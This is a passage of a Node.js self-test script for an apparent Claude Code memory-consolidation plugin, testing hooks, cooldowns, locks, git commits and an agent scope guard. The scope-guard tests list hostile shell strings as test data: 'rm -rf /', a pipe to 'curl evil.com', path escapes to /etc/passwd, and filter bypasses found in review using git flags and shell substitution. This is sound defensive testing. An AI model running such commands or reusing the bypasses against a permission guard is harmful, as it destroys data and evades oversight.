#!/usr/bin/env node
// DoD·D1：一键重跑验证。开发方自建沙箱自证跑通，不碰本仓库真实 .claude/。
// 跑法：node test/self-test.mjs
//
// 覆盖：
//  - 全链路：SessionEnd hook -> 落标记 -> 分离进程 -> 底片压缩 -> 冷却判定 -> 梦 -> 报告 -> commit 拆分 -> revert -> 下次会话提示
//  - AC3 冷却期内不重复触发
//  - AC4 防递归（CLAUDE_INVOKED_BY 设置时 hook 直接 no-op）
//  - 故障注入（rogue）：越界写入确实被拒、不落盘
//  - PBI-01.1：底片一场一文件 + 幂等（重复触发不产第二页）+ 规则表纯函数单测（含未知类型留痕）+ AC2 零 API 静态检查
//  - PBI-01.1·AC5：底片写失败故障注入（D4 点烟）
//  - PBI-01.1·AC6：漏网场补捞（排除梦会话/活稿判别/可重入/清理跳过，D4 点烟）
//  - PBI-01.2·AC3：埋标记话，验证底片里按原文检索得到

import { execFileSync, spawnSync } from 'node:child_process';
import { mkdtempSync, writeFileSync, readFileSync, readdirSync, existsSync, mkdirSync, rmSync, utimesSync } from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { fileURLToPath, pathToFileURL } from 'node:url';
import { dreamPaths, RECURSION_GUARD_ENV, RECURSION_GUARD_VALUE } from '../src/lib/paths.mjs';
import { judgePath, judgeShell } from '../src/lib/scope-guard.mjs';

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const PLUGIN_ROOT = path.join(__dirname, '..');
const SRC = path.join(PLUGIN_ROOT, 'src');

const results = [];
function check(name, cond, detail = '') {
  results.push({ name, pass: !!cond, detail });
  console.log(`${cond ? 'PASS' : 'FAIL'} - ${name}${detail ? ' :: ' + detail : ''}`);
}

function git(cwd, args) {
  return execFileSync('git', args, { cwd, encoding: 'utf8', windowsHide: true }).trim();
}

// Sprint-2：每个沙箱配一份假逐字稿，模拟 SessionEnd payload 的 transcript_path 指向的东西。
// 埋一条带唯一 marker 的用户消息，供 PBI-01.2·AC3「按原文检索到」类断言直接 grep 底片文件。
function fakeTranscriptLines(sessionId, marker) {
  const ts = new Date().toISOString();
  return [
    { type: 'user', sessionId, uuid: 'fake-u1', timestamp: ts, isSidechain: false, userType: 'external', cwd: '', version: 'test', parentUuid: null, message: { role: 'user', content: [{ type: 'text', text: `${marker} —— 用户说的这句话不该蒸发` }] } },
    { type: 'assistant', sessionId, uuid: 'fake-a1', timestamp: ts, isSidechain: false, userType: 'external', cwd: '', version: 'test', parentUuid: 'fake-u1', message: { model: 'test', id: 'msg-1', type: 'message', role: 'assistant', content: [{ type: 'text', text: '收到，已记录。' }] } },
  ].map((e) => JSON.stringify(e)).join('\n') + '\n';
}

function sandboxSessionId(label) {
  return `${label}-session-id`;
}
function sandboxMarker(label) {
  return `SELF-TEST-MARKER-${label}-${process.pid}`;
}
function sandboxTranscriptPath(dir) {
  return path.join(dir, 'fake-transcript.jsonl');
}

function makeSandbox(label) {
  const dir = mkdtempSync(path.join(os.tmpdir(), `claude-dream-self-test-${label}-`));
  git(dir, ['init', '-q']);
  git(dir, ['config', 'user.email', 'test@example.com']);
  git(dir, ['config', 'user.name', 'claude-dream self-test']);
  mkdirSync(path.join(dir, '.claude', 'memory'), { recursive: true });
  writeFileSync(
    path.join(dir, '.claude', 'memory', 'existing-fact.md'),
    '---\nname: existing-fact\ndescription: 沙箱预置的一条既有记忆\nmetadata:\n  type: project\n---\n\n沙箱预置内容，供测试对照，不应被占位引擎动到。\n',
    'utf8'
  );
  writeFileSync(
    path.join(dir, '.claude', 'memory', 'MEMORY.md'),
    '# Memory Index\n\n- [既有事实](existing-fact.md) — 沙箱预置\n',
    'utf8'
  );
  writeFileSync(path.join(dir, 'CLAUDE.md'), '# Sandbox Project\n\n自测沙箱，不是真实项目。\n', 'utf8');
  git(dir, ['add', '-A']);
  git(dir, ['commit', '-q', '-m', 'initial sandbox state']);

  const sessionId = sandboxSessionId(label);
  writeFileSync(sandboxTranscriptPath(dir), fakeTranscriptLines(sessionId, sandboxMarker(label)), 'utf8');

  return dir;
}

// Sprint-2 起 session-end.mjs 硬性要求 stdin 携带 session_id/transcript_path/cwd——
// 每处调用都要带这三样，不能只传 cwd 了（老约定已废止，见 session-end.mjs 顶部注释）。
function sessionEndPayload(sandbox, label) {
  return { cwd: sandbox, session_id: sandboxSessionId(label), transcript_path: sandboxTranscriptPath(sandbox) };
}

function runNode(scriptPath, args, { cwd, stdinJson, env } = {}) {
  return spawnSync(process.execPath, [scriptPath, ...(args ?? [])], {
    cwd: cwd ?? PLUGIN_ROOT,
    input: stdinJson !== undefined ? JSON.stringify(stdinJson) : '',
    encoding: 'utf8',
    env: { ...process.env, ...(env ?? {}) },
    windowsHide: true,
  });
}

async function waitFor(predicate, { timeoutMs = 120000, intervalMs = 1000 } = {}) {
  const start = Date.now();
  while (Date.now() - start < timeoutMs) {
    if (await predicate()) return true;
    await new Promise((r) => setTimeout(r, intervalMs));
  }
  return false;
}

function testScopeGuardUnit() {
  console.log('\n=== scope-guard 纯函数单测（无需沙箱/SDK） ===');
  const root = process.platform === 'win32' ? 'C:\\fake-root' : '/fake-root';
  const outsideAbs = process.platform === 'win32' ? 'C:\\somewhere-else\\outside.md' : '/somewhere-else/outside.md';
  const j = (p) => path.join(root, p);

  check('允许：写 .claude/memory/ 下的文件', judgePath(j('.claude/memory/x.md'), root).allow);
  check('允许：写 .claude/dream/ 下的文件', judgePath(j('.claude/dream/x.log'), root).allow);
  check('允许：写 CLAUDE.md（阀门默认开）', judgePath(j('CLAUDE.md'), root).allow);
  check('拒绝：相对路径逃逸 ../../outside.md', !judgePath('../../outside.md', root).allow);
  check('拒绝：绝对路径直接指到项目外的另一棵树', !judgePath(outsideAbs, root).allow);
  check('拒绝：看似在白名单前缀但其实是兄弟目录 .claude/memory-evil/x.md', !judgePath(j('.claude/memory-evil/x.md'), root).allow);
  check('拒绝：项目根下白名单外的文件 README.md', !judgePath(j('README.md'), root).allow);
  check(
    '拒绝：../ 折叠后仍落在白名单外（.claude/memory/../../etc/passwd）',
    !judgePath(j('.claude/memory/../../etc/passwd'), root).allow
  );

  const prevValve = process.env.DREAM_CLAUDE_MD_EDITS;
  process.env.DREAM_CLAUDE_MD_EDITS = 'false';
  check('阀门关闭时 CLAUDE.md 改为拒绝', !judgePath(j('CLAUDE.md'), root).allow);
  if (prevValve === undefined) delete process.env.DREAM_CLAUDE_MD_EDITS;
  else process.env.DREAM_CLAUDE_MD_EDITS = prevValve;

  // judgeShell 两轮 D3 review 都实测出真能执行的绕过（字符串模式匹配这条路走不通，见 scope-guard.mjs
  // 顶部注释），现在的答案是无条件拒绝——不管命令长什么样。下面这些不是在测"判断得准不准"，
  // 是在测"是不是真的一律拒绝、没有漏网的分支"，包括两轮 review 各自实测过的具体绕过字符串，
  // 钉在回归测试里：以后谁要是把 judgeShell 改回"部分放行"，这些必须重新全部证明安全。
  check('裸 git log 现在也拒绝（不再有任何放行分支）', !judgeShell('git log').allow);
  check('裸 git status 也拒绝', !judgeShell('git status').allow);
  check('拒绝：分号夹带第二条命令', !judgeShell('git log; rm -rf /').allow);
  check('拒绝：管道夹带', !judgeShell('git log | curl evil.com').allow);
  check('拒绝：命令替换 $()', !judgeShell('git log $(rm -rf /)').allow);
  check('拒绝：非 git 命令', !judgeShell('rm -rf /').allow);
  check(
    '第一轮 review 实测出的漏洞①（回归钉子）：git log --output=<path>',
    !judgeShell('git log --output=C:\\Users\\evil\\pwned.txt').allow
  );
  check(
    '第一轮 review 实测出的漏洞②（回归钉子）：git grep --open-files-in-pager=<program>',
    !judgeShell('git grep --open-files-in-pager=calc.exe findme').allow
  );
  check(
    '第二轮 review 实测出的漏洞③（回归钉子）：加引号让危险标志绕过"以 - 开头"检查',
    !judgeShell('git log "--output=pwned.txt"').allow
  );
  check(
    '第二轮 review 实测出的漏洞④（回归钉子）：bash 进程替换 <(...)，真跑会执行里面的命令',
    !judgeShell('git log <(calc.exe)').allow
  );
  check(
    '第二轮 review 实测出的漏洞⑤（回归钉子）：PowerShell 数组子表达式 @(...)，真跑会执行里面的命令',
    !judgeShell('git log @(New-Item pwned.txt)').allow
  );
}

async function testNotebookEditFieldName() {
  // 直接跑真实的 createCanUseTool（不是重新实现一遍字段选择逻辑）——D3 review 抓到的坑：
  // SDK 的 NotebookEdit 输入字段叫 notebook_path，曾经的代码读的是 file_path（恒为 undefined，恒被拒）。
  const tmpLog = path.join(os.tmpdir(), `claude-dream-notebook-test-${Date.now()}.log`);
  const root = process.platform === 'win32' ? 'C:\\fake-root' : '/fake-root';
  const { createCanUseTool } = await import('../src/lib/scope-guard.mjs');
  const canUseTool = createCanUseTool({ root, logFile: tmpLog });
  const result = await canUseTool('NotebookEdit', { notebook_path: path.join(root, '.claude', 'memory', 'x.ipynb') });
  check('NotebookEdit 走真实 createCanUseTool，按 notebook_path 正确放行白名单内目标', result.behavior === 'allow');
  rmSync(tmpLog, { force: true });
}

async function testFullChainAndRevertAndCooldownAndRecursion() {
  const sandbox = makeSandbox('chain');
  const paths = dreamPaths(sandbox);
  console.log(`\n=== 全链路 + revert + 冷却 + 防递归（沙箱: ${sandbox}） ===`);

  // 1) 防递归：CLAUDE_INVOKED_BY 已设置时，hook 必须直接 no-op，不落标记、不拉梦。
  runNode(path.join(SRC, 'session-end.mjs'), [], {
    cwd: sandbox,
    stdinJson: sessionEndPayload(sandbox, 'chain'),
    env: { [RECURSION_GUARD_ENV]: RECURSION_GUARD_VALUE },
  });
  check('AC4 防递归：设了 CLAUDE_INVOKED_BY 时不落触发标记', !existsSync(paths.sessionEndMarker));

  // 2) 正常 SessionEnd：应落标记、detached 拉起分离进程、最终跑完一场梦。
  const before = Date.now();
  const sessionEndRun = runNode(path.join(SRC, 'session-end.mjs'), [], { cwd: sandbox, stdinJson: sessionEndPayload(sandbox, 'chain') });
  check('SessionEnd hook 本身快速退出（不等梦跑完）', sessionEndRun.status === 0);
  check('AC2 触发标记已落盘', existsSync(paths.sessionEndMarker));

  const dreamDone = await waitFor(() => {
    if (!existsSync(paths.lastDreamState)) return false;
    const state = JSON.parse(readFileSync(paths.lastDreamState, 'utf8'));
    return state.status && state.status !== 'running' && new Date(state.lastDreamAt).getTime() >= before;
  });
  check('分离进程确实跑完一场梦（last-dream.json 落地 completed/failed）', dreamDone);

  // PBI-01.1：底片压缩在 trigger-check.mjs 里先于拉梦逻辑同步跑完（定序），dreamDone 为真时
  // 底片这一步必然也已经跑过——不需要另外等。
  const negChainSessionId = sandboxSessionId('chain');
  const negLedgerPath = paths.negativeLedger;
  const negLedger = existsSync(negLedgerPath) ? JSON.parse(readFileSync(negLedgerPath, 'utf8')) : {};
  const negRecord = negLedger[negChainSessionId];
  check('PBI-01.1·AC1 台账记录了本场会话的底片', !!negRecord, JSON.stringify(negLedger));
  const negPageFile = negRecord?.pages?.[0]?.file;
  const negPagePath = negPageFile ? path.join(paths.negativesDir, negPageFile) : null;
  check('PBI-01.1·AC1 底片文件确实落盘、一场一文件、可寻址（文件名含 session id）', negPagePath && existsSync(negPagePath) && negPageFile.startsWith(negChainSessionId));
  if (negPagePath && existsSync(negPagePath)) {
    const negContent = readFileSync(negPagePath, 'utf8');
    check(
      'PBI-01.2·AC3 裁决回程有名分：埋的标记话能在底片里按原文检索到',
      negContent.includes(sandboxMarker('chain'))
    );
  }

  const lastState = existsSync(paths.lastDreamState) ? JSON.parse(readFileSync(paths.lastDreamState, 'utf8')) : null;
  check('梦跑完状态是 completed（不是 failed）', lastState?.status === 'completed', JSON.stringify(lastState?.summary?.sdkError ?? ''));

  const runId = lastState?.summary?.runId;
  const placeholderPath = runId ? path.join(sandbox, '.claude', 'memory', `dream-placeholder-${runId}.md`) : null;
  check('PBI-04.3·AC1 占位整合：新记忆文件确实落盘', runId && existsSync(placeholderPath));

  const memoryIndex = existsSync(paths.memoryIndex) ? readFileSync(paths.memoryIndex, 'utf8') : '';
  check('MEMORY.md 索引行已回补指向新文件', runId && memoryIndex.includes(`dream-placeholder-${runId}`));
  check('MEMORY.md 未被写入正文内容（仍保持纯指针索引，行数受控）', memoryIndex.split('\n').length < 20, `实际行数=${memoryIndex.split('\n').length}`);

  // DoD·D2：不破坏官方 auto-memory 契约——一记一文件，且新记忆文件本身要有规范 frontmatter。
  if (placeholderPath && existsSync(placeholderPath)) {
    const placeholderContent = readFileSync(placeholderPath, 'utf8');
    const hasFrontmatter = /^---\r?\nname: [\s\S]+?\r?\ndescription: [\s\S]+?metadata:\r?\n\s+type: \w+\r?\n---/.test(placeholderContent);
    check('DoD·D2 新记忆文件带规范 frontmatter（name/description/metadata.type）', hasFrontmatter, placeholderContent.slice(0, 200));
  }
  check('DoD·D2 既有记忆文件未被占位引擎动过', existsSync(path.join(sandbox, '.claude', 'memory', 'existing-fact.md')));
  if (existsSync(path.join(sandbox, '.claude', 'memory', 'existing-fact.md'))) {
    const existingContent = readFileSync(path.join(sandbox, '.claude', 'memory', 'existing-fact.md'), 'utf8');
    check('既有记忆内容原样未改', existingContent.includes('沙箱预置内容，供测试对照，不应被占位引擎动到。'));
  }

  const reportPath = runId ? path.join(sandbox, '.claude', 'dream', `${runId}-report.md`) : null;
  check('PBI-04.3·AC2 梦报告已落盘', runId && existsSync(reportPath));
  if (reportPath && existsSync(reportPath)) {
    const report = readFileSync(reportPath, 'utf8');
    const sixSections = ['图 delta 对账', '30 秒版', '明细', '隔离观察区', '抽查点', '阀门状态'];
    check('梦报告六节骨架齐全', sixSections.every((s) => report.includes(s)), sixSections.filter((s) => !report.includes(s)).join(','));

    // PBI-01.2·AC1：进料对账须包含触发本次梦的那场会话的底片，session id 对得上——
    // 这里的 sandboxSessionId('chain') 就是本场触发 session-end.mjs 的那个 session_id，
    // 断言报告文本里能看到它、且明确写着"已读到"（不是含糊带过）。
    check('PBI-01.2·AC1 进料对账行出现在报告里', report.includes('进料对账'));
    check('PBI-01.2·AC1 进料对账含触发会话 session id', report.includes(sandboxSessionId('chain')));
    check('PBI-01.2·AC1 进料对账明确写着已读到底片', report.includes('已读到'));
  }

  const logPath = runId ? path.join(sandbox, '.claude', 'dream', `${runId}-canUseTool.log`) : null;
  check('PBI-04.2·AC2 canUseTool 裁决日志已落盘', runId && existsSync(logPath));
  let invocations = [];
  if (logPath && existsSync(logPath)) {
    invocations = readFileSync(logPath, 'utf8').trim().split('\n').filter(Boolean).map((l) => JSON.parse(l));
  }
  check('canUseTool 确实被调用过（至少一次裁决记录）', invocations.length > 0, `count=${invocations.length}`);
  check('至少一次 allow（占位记忆的 Write 落盘）', invocations.some((i) => i.decision === 'allow'));

  const log = git(sandbox, ['log', '--oneline']);
  check('PBI-04.3·AC3 存在 dream: 前缀提交', /\bdream: /.test(log), log);
  check('report/log 证据另笔提交（dream-evidence:），不与记忆改动混在一笔', /\bdream-evidence: /.test(log), log);
  check('commitResults 没有报 dreamError/evidenceError（正常路径应该干净）', !lastState?.summary?.commits?.dreamError && !lastState?.summary?.commits?.evidenceError);

  // D3 review 抓到的坑修复验证：last-dream.json/session-end-marker.json 是纯运行态，
  // 不该出现在任何一笔提交的树里——否则 evidence 提交会永久记录一份"这场梦还在跑"的假状态。
  const evidenceSha = lastState?.summary?.commits?.evidence;
  if (evidenceSha) {
    const showLastDream = spawnSync('git', ['show', `${evidenceSha}:.claude/dream/last-dream.json`], { cwd: sandbox, encoding: 'utf8', windowsHide: true });
    check('last-dream.json 没有被 evidence 提交收进去（应该在该提交树里查不到）', showLastDream.status !== 0);
  }
  const preSha = git(sandbox, ['log', '--oneline', '--grep=^dream-pre:', '-1', '--format=%H']);
  if (preSha) {
    const showMarkerInPre = spawnSync('git', ['show', `${preSha}:.claude/dream/session-end-marker.json`], { cwd: sandbox, encoding: 'utf8', windowsHide: true });
    check('session-end-marker.json 没有被 dream-pre 快照收进去', showMarkerInPre.status !== 0);
  }
  check('AC4 下次会话提示行载体已落盘', existsSync(paths.promptCarrier));

  // 3) revert 验证：dream: 提交应可单独撤销，且不影响 evidence 提交里的报告/日志。
  const dreamSha = git(sandbox, ['log', '--oneline', '--grep=^dream:', '-1', '--format=%H']);
  let revertOk = false;
  if (dreamSha) {
    const revertResult = spawnSync('git', ['revert', '--no-edit', dreamSha], { cwd: sandbox, encoding: 'utf8', windowsHide: true });
    revertOk = revertResult.status === 0;
  }
  check('PBI-04.3·AC3 git revert 单独回滚 dream: 提交成功', revertOk);
  check('revert 后占位记忆文件消失', runId && !existsSync(placeholderPath));
  check('revert 后报告文件依然在（证据没被一起销毁，对应 verdict C7）', runId && existsSync(reportPath));

  // 4) 冷却期验证：紧接着再触发一次 SessionEnd，默认 30 分钟冷却内不应该再跑一场梦。
  const stateBeforeSecondTrigger = readFileSync(paths.lastDreamState, 'utf8');
  runNode(path.join(SRC, 'session-end.mjs'), [], { cwd: sandbox, stdinJson: sessionEndPayload(sandbox, 'chain') });
  await new Promise((r) => setTimeout(r, 3000)); // 给 detached 分离进程足够时间跑到冷却判断那一步
  const stateAfterSecondTrigger = readFileSync(paths.lastDreamState, 'utf8');
  check('AC3 冷却期内不重复触发（last-dream.json 未被再次改写）', stateBeforeSecondTrigger === stateAfterSecondTrigger);

  // 同一次触发也把底片幂等一并验了：逐字稿没变，重复 SessionEnd 不该多出第二页。
  const negLedgerAfterRetrigger = existsSync(negLedgerPath) ? JSON.parse(readFileSync(negLedgerPath, 'utf8')) : {};
  const negPagesAfterRetrigger = negLedgerAfterRetrigger[negChainSessionId]?.pages ?? [];
  check('PBI-01.1·AC1 幂等：逐字稿未变时重复触发不产生第二页底片', negPagesAfterRetrigger.length === 1, `pages=${negPagesAfterRetrigger.length}`);

  // 5) SessionStart 消费提示行。
  const startResult = runNode(path.join(SRC, 'session-start.mjs'), [], { cwd: sandbox, stdinJson: { cwd: sandbox } });
  check('PBI-04.3·AC4 下次会话开场输出一行提示', startResult.stdout.trim().length > 0, startResult.stdout.trim());
  check('提示行载体读一次后被消费', !existsSync(paths.promptCarrier));

  return sandbox;
}

async function testNegativesFaultInjection() {
  // AC5（守卫类，D4 点烟）：写失败时静默降级、不阻塞散会链路；错误留痕落点在底片目录之外。
  // 真造一次写失败（环境变量注入开关），亲眼看降级与留痕——不是读代码猜它"应该"没事。
  const sandbox = makeSandbox('fault');
  const paths = dreamPaths(sandbox);
  console.log(`\n=== PBI-01.1·AC5 底片写失败故障注入（D4 点烟），沙箱: ${sandbox} ===`);

  const before = Date.now();
  runNode(path.join(SRC, 'session-end.mjs'), [], {
    cwd: sandbox,
    stdinJson: sessionEndPayload(sandbox, 'fault'),
    env: { CLAUDE_DREAM_NEGATIVES_INJECT_WRITE_FAILURE: 'true' },
  });

  const dreamDone = await waitFor(() => {
    if (!existsSync(paths.lastDreamState)) return false;
    const state = JSON.parse(readFileSync(paths.lastDreamState, 'utf8'));
    return state.status && state.status !== 'running' && new Date(state.lastDreamAt).getTime() >= before;
  });
  check('AC5 底片写失败不阻塞散会链路：梦依然正常跑完', dreamDone);
  const lastState = existsSync(paths.lastDreamState) ? JSON.parse(readFileSync(paths.lastDreamState, 'utf8')) : null;
  check('梦本身状态 completed（底片故障没有连带搞垮拉梦逻辑）', lastState?.status === 'completed');

  const negLedger = existsSync(paths.negativeLedger) ? JSON.parse(readFileSync(paths.negativeLedger, 'utf8')) : {};
  check('AC5 红：注入生效时确实没有产出底片页（台账里没有这个 session 的记录）', !negLedger[sandboxSessionId('fault')]);
  const negFilesAfterFault = existsSync(paths.negativesDir) ? readdirSync(paths.negativesDir) : [];
  check('AC5 红：底片目录里没有产出任何 .md 页面（目录本身可能因 mkdir 而存在，但不该有页面）', !negFilesAfterFault.some((f) => f.endsWith('.md')), JSON.stringify(negFilesAfterFault));

  check('AC5 错误留痕落点确实在底片目录之外', existsSync(paths.negativeErrorTrace) && path.dirname(paths.negativeErrorTrace) !== paths.negativesDir);
  if (existsSync(paths.negativeErrorTrace)) {
    const trace = readFileSync(paths.negativeErrorTrace, 'utf8');
    check('错误留痕内容包含注入失败的原因', trace.includes('CLAUDE_DREAM_NEGATIVES_INJECT_WRITE_FAILURE'));
  }

  return sandbox;
}

async function testBackfillNegatives() {
  // PBI-01.1·AC6：漏网场补捞。CLAUDE_CONFIG_DIR 指向临时目录，不碰真实 ~/.claude/projects/
  // （沙箱纪律：不碰本仓库真实 .claude/，这里连全局 ~/.claude/ 都不能碰）。
  console.log('\n=== PBI-01.1·AC6 漏网场补捞（D4 点烟：真造一场无结束事件的会话） ===');

  const { backfillNegatives } = await import(pathToFileURL(path.join(SRC, 'negatives', 'backfill.mjs')).href);

  const prevConfigDir = process.env.CLAUDE_CONFIG_DIR;
  const configDir = mkdtempSync(path.join(os.tmpdir(), 'claude-dream-self-test-backfill-config-'));
  const root = mkdtempSync(path.join(os.tmpdir(), 'claude-dream-self-test-backfill-root-'));

  try {
    process.env.CLAUDE_CONFIG_DIR = configDir;
    const encoded = root.replace(/[^a-zA-Z0-9]/g, '-');
    const transcriptsDir = path.join(configDir, 'projects', encoded);
    mkdirSync(transcriptsDir, { recursive: true });

    const writeFakeTranscript = (sessionId, text) => {
      const p = path.join(transcriptsDir, `${sessionId}.jsonl`);
      writeFileSync(p, JSON.stringify({ type: 'user', message: { role: 'user', content: [{ type: 'text', text }] } }) + '\n', 'utf8');
      return p;
    };

    // 场景①：一场真实的、够旧的、没触发过 SessionEnd 的会话——这是 AC6 要补的主角。
    const missedId = 'missed-session-1';
    const missedPath = writeFakeTranscript(missedId, 'BACKFILL-MARKER-missed');
    const oldTime = new Date(Date.now() - 60 * 60 * 1000);
    utimesSync(missedPath, oldTime, oldTime);

    // 场景②：梦自己的会话，登记进 dreamSessionIdsLog——AC6①必须排除，不能自吞。
    const dreamId = 'dream-own-session-1';
    const dreamTranscriptPath = writeFakeTranscript(dreamId, '不该被压成底片');
    utimesSync(dreamTranscriptPath, oldTime, oldTime);
    mkdirSync(path.join(root, '.claude', 'dream'), { recursive: true });
    writeFileSync(path.join(root, '.claude', 'dream', 'dream-session-ids.log'), dreamId + '\n', 'utf8');

    // 场景③：mtime 是刚刚——大概率还在进行中的活会话，AC6②不得误冻。
    const activeId = 'active-session-1';
    writeFakeTranscript(activeId, '还在打字');

    const summary = await backfillNegatives({ root });
    const byId = Object.fromEntries((summary.results ?? []).map((r) => [r.sessionId, r.status]));

    check('AC6 补捞：漏网会话确实产出底片（status=written）', byId[missedId] === 'written', JSON.stringify(byId));
    check('AC6① 排除梦会话：梦自己的逐字稿被跳过、没压成底片', byId[dreamId] === 'skipped-dream-session');
    check('AC6② 活稿判别：mtime 太新的会话没被误冻', byId[activeId] === 'skipped-active');

    const ledgerPath = path.join(root, '.claude', 'negatives', 'ledger.json');
    const ledger = existsSync(ledgerPath) ? JSON.parse(readFileSync(ledgerPath, 'utf8')) : {};
    check('梦会话没有留下台账记录', !ledger[dreamId]);
    check('活会话没有留下台账记录', !ledger[activeId]);

    const missedPage = ledger[missedId]?.pages?.[0]?.file;
    if (missedPage) {
      const pageContent = readFileSync(path.join(root, '.claude', 'negatives', missedPage), 'utf8');
      check('补捞产出的底片能按原文检索到标记话', pageContent.includes('BACKFILL-MARKER-missed'));
    }

    // AC6③ 补捞可重入：再跑一遍，漏网会话不该产生第二页。
    const summary2 = await backfillNegatives({ root });
    const byId2 = Object.fromEntries((summary2.results ?? []).map((r) => [r.sessionId, r.status]));
    check('AC6③ 补捞可重入：再跑一遍不产生第二页（幂等）', byId2[missedId] === 'skipped-no-new', JSON.stringify(byId2));

    // AC6④：逐字稿已被清理——记账跳过、不报错。直接构造一个不存在的 transcript_path 场景，
    // 复用 processSessionTranscript（backfill 与 session-end 共用同一条编排逻辑）。
    const { processSessionTranscript } = await import(pathToFileURL(path.join(SRC, 'negatives', 'write-negative.mjs')).href);
    const cleanedUpResult = await processSessionTranscript({
      root,
      sessionId: 'already-cleaned-up-session',
      transcriptPath: path.join(root, 'does-not-exist-anymore.jsonl'),
    });
    check('AC6④ 逐字稿已被官方清理：记账跳过、不报错', cleanedUpResult.status === 'skipped-missing-transcript', JSON.stringify(cleanedUpResult));
  } finally {
    if (prevConfigDir === undefined) delete process.env.CLAUDE_CONFIG_DIR;
    else process.env.CLAUDE_CONFIG_DIR = prevConfigDir;
    rmSync(configDir, { recursive: true, force: true, maxRetries: 5, retryDelay: 200 });
    rmSync(root, { recursive: true, force: true, maxRetries: 5, retryDelay: 200 });
  }
}

async function testConcurrentTriggerLock() {
  // D3 review 抓到的坑：原来的"锁"是 check-then-write，靠得够近的两次 SessionEnd 能一起穿过冷却期检查、
  // 都去跑梦。这里真刀真枪触发两次几乎同时的 SessionEnd（不等第一次的 detached 子进程跑完），
  // 断言最终只有一场梦真正跑完、只留一笔 dream: 提交——不是"大概率不会撞上"，是结构上不可能同时通过。
  const sandbox = makeSandbox('concurrent');
  const paths = dreamPaths(sandbox);
  console.log(`\n=== 并发触发防重（锁），沙箱: ${sandbox} ===`);

  runNode(path.join(SRC, 'session-end.mjs'), [], { cwd: sandbox, stdinJson: sessionEndPayload(sandbox, 'concurrent') });
  runNode(path.join(SRC, 'session-end.mjs'), [], { cwd: sandbox, stdinJson: sessionEndPayload(sandbox, 'concurrent') });

  const settled = await waitFor(() => {
    if (!existsSync(paths.lastDreamState)) return false;
    const state = JSON.parse(readFileSync(paths.lastDreamState, 'utf8'));
    return state.status && state.status !== 'running' && !existsSync(paths.lockFile);
  });
  check('两次几乎同时的 SessionEnd 最终都落定（锁释放、状态不再是 running）', settled);

  const dreamCommitCount = (git(sandbox, ['log', '--oneline', '--grep=^dream:']).match(/^\S+ dream:/gm) ?? []).length;
  check('只有一笔 dream: 提交，不是两笔并发跑出来的两笔', dreamCommitCount === 1, `实际 ${dreamCommitCount} 笔`);

  return sandbox;
}

async function testRogue() {
  const sandbox = makeSandbox('rogue');
  console.log(`\n=== 故障注入 rogue 模式（沙箱: ${sandbox}） ===`);

  const result = runNode(path.join(SRC, 'run-dream.mjs'), ['--rogue', sandbox], { cwd: sandbox });
  check('rogue 模式跑完退出码为 0（越界被拒不算梦失败）', result.status === 0, result.stderr);

  let summary = null;
  try {
    summary = JSON.parse(result.stdout);
  } catch {
    // ignore
  }
  check('rogue 输出包含可解析的 summary', !!summary, result.stdout.slice(0, 300));

  const roguePath = path.join(sandbox, 'ROGUE-TARGET.md');
  check('①故障注入入口：越界文件确实没有落盘（围栏拦下了）', !existsSync(roguePath));
  check('summary.rogueBlocked 为 true', summary?.rogueBlocked === true);

  if (summary?.runId) {
    const logPath = path.join(sandbox, '.claude', 'dream', `${summary.runId}-canUseTool.log`);
    const invocations = existsSync(logPath)
      ? readFileSync(logPath, 'utf8').trim().split('\n').filter(Boolean).map((l) => JSON.parse(l))
      : [];
    check(
      'canUseTool 日志里有一条针对 ROGUE-TARGET.md 的 deny',
      invocations.some((i) => i.decision === 'deny' && i.input?.file_path?.includes('ROGUE-TARGET.md'))
    );
  }

  return sandbox;
}

async function testRogueTargetsNegativesDir() {
  // PBI-01.2·AC2（守卫类，D4 点烟）：梦对底片零写权。canUseTool 白名单结构上不含
  // negativesDir（scope-guard.mjs 的 judgePath 只认 memory/dream/CLAUDE.md 三处），
  // 这里不是读代码猜"应该拒绝"，是真让作恶模式指向 .claude/negatives/ 里的具体文件，
  // 亲眼看它被拒、且拒绝日志里能看到这个路径。
  const sandbox = makeSandbox('rogue-negatives');
  console.log(`\n=== PBI-01.2·AC2 作恶模式指定目标为底片目录（D4 点烟），沙箱: ${sandbox} ===`);

  const target = '.claude/negatives/rogue-attempt.md';
  const result = runNode(path.join(SRC, 'run-dream.mjs'), ['--rogue', `--target=${target}`, sandbox], { cwd: sandbox });
  check('指定底片目录为目标：rogue 模式跑完退出码为 0（越界被拒不算梦失败）', result.status === 0, result.stderr);

  let summary = null;
  try {
    summary = JSON.parse(result.stdout);
  } catch {
    // ignore
  }
  check('summary.rogueTargetPath 确实是指定的底片目录路径', summary?.rogueTargetPath === target, JSON.stringify(summary?.rogueTargetPath));
  check('AC2 红：指向底片目录的越界文件确实没有落盘', !existsSync(path.join(sandbox, target)));
  check('summary.rogueBlocked 为 true', summary?.rogueBlocked === true);

  if (summary?.runId) {
    const logPath = path.join(sandbox, '.claude', 'dream', `${summary.runId}-canUseTool.log`);
    const invocations = existsSync(logPath)
      ? readFileSync(logPath, 'utf8').trim().split('\n').filter(Boolean).map((l) => JSON.parse(l))
      : [];
    check(
      'AC2 拒绝日志里能看到该路径（底片目录内具体文件）',
      invocations.some((i) => i.decision === 'deny' && i.input?.file_path?.replace(/\\/g, '/').includes('.claude/negatives/rogue-attempt.md'))
    );
  }

  return sandbox;
}

async function testStaleLockDetection() {
  // D3 review 三轮抓到的坑：锁只查"文件在不在"，上一场梦硬死（kill -9 / 断电 / OOM）没走到 finally 的
  // releaseLock 时 dream.lock 永久残留，之后每次触发都撞 EEXIST 直接退出，梦从此停摆、无人发现。
  // 修复靠锁里记的 pid 判定存活：pid 死 = 残留可清，pid 活 = 真在跑别抢。三条边界钉进回归。
  console.log('\n=== 崩溃残留锁自愈（stale lock 判定 + 清锁重抢，不起会话） ===');
  const { isStaleLock, acquireLock, releaseLock } = await import('../src/trigger-check.mjs');
  const tmpDir = mkdtempSync(path.join(os.tmpdir(), 'claude-dream-lock-test-'));
  const lockPath = path.join(tmpDir, 'dream.lock');

  // 死 pid：spawnSync 同步跑一个立即退出的子进程，返回时该 pid 已确定查无此进程。
  const dead = spawnSync(process.execPath, ['-e', 'process.exit(0)'], { windowsHide: true });
  writeFileSync(lockPath, JSON.stringify({ pid: dead.pid, acquiredAt: new Date().toISOString() }));
  check('死 pid 的锁判定为 stale（崩溃残留）', isStaleLock(lockPath) === true);
  check('残留锁被清掉并重新获取（acquireLock 返回 true）', acquireLock(lockPath) === true);
